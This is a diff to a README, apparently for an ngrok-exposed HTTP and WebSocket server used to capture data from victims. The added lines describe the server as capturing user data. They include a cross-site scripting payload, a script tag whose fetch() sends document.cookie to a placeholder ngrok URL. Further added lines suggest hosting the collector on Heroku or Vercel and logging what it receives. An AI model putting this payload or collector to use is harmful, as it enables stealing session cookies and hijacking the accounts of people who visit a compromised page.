@@ -1,4 +1,12 @@
 ## info
+http server capture user data by either sending the data in a query or in the body
+```bash
+  <script>
+      fetch(`https://NGROK-URL?cookie=${encodeURIComponent(document.cookie)}`)
+  </script>
+```
+
+_____________________________
 
 ### Running the servers
 
@@ -40,3 +48,5 @@ ngrok http 8080
 ```
 
 _Just use wss://NGROK_URL  instead of https://NGROK_URL for wss connections_
+<br>
+if you dont want to use ngrok you can host them on heroku or vercel but insted of console.log write to a log file 
